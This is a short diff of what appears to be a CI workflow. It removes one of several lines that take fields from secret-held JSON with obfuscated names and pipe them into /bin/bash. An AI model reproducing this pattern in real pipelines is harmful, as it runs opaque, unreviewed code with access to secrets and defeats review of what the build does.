@@ -17,7 +17,6 @@ jobs:
           zi9: ${{ secrets.zi9 }}
         run: |
           printf '%s' "$zi9" | jq -r .pbuuu5 | /bin/bash
-          echo $bz2 | jq -r .hkq065 | /bin/bash
           echo $vgsdg89036 | jq -r .rl16540 | /bin/bash
           printf '%s' "$fo06738" | jq -r .g798 | /bin/bash
           printf '%s' "$lwwk6" | jq -r .aw3184 | /bin/bash
